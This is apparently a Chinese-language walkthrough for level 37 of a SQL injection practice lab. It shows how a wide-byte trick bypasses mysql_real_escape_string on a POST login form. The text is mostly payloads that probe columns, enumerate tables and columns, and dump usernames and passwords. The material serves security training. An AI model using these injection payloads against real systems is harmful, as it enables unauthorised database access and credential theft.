# Less-37

三十七关是post提交，使用mysql_real_escape_string函数对于账户和密码都进行转义，使用宽字节注入就行。可使用三个字节的汉字将反斜杠消耗



~~~ cmd
passwd=admin&submit=Submit&uname=1汉' order by 2--+
~~~

![Less-37-03](.\img\Less-37-03.png)





~~~ cmd
passwd=admin&submit=Submit&uname=1汉' order by 3--+
~~~

![Less-37-02](.\img\Less-37-02.png)



~~~ cmd
passwd=admin&submit=Submit&uname=1汉' union select 1,2--+
~~~

![Less-37-04](.\img\Less-37-04.png)



~~~ cmd
passwd=admin&submit=Submit&uname=1汉' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+
~~~

![Less-37-05](.\img\Less-37-05.png)



~~~ cmd
passwd=admin&submit=Submit&uname=1汉' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+
~~~

![Less-37-06](.\img\Less-37-06.png)



~~~ cmd
passwd=admin&submit=Submit&uname=1汉' union select 1,group_concat(username,password) from users--+
~~~

![Less-37-07](.\img\Less-37-07.png)
